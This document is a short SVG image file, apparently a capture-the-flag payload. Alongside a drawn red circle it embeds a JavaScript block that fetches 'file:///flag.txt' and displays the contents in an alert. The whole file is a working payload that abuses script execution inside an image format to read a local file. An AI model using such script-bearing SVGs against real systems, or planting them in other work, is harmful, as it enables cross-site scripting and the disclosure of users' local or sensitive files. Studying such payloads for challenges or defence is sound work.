<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
   <script type="text/javascript">
    fetch('file:///flag.txt')
      .then(response => response.text())
      .then(data => {
        alert(data);
      })
      .catch(error => {
        alert("Error: " + error);
      });
  </script>
</svg> 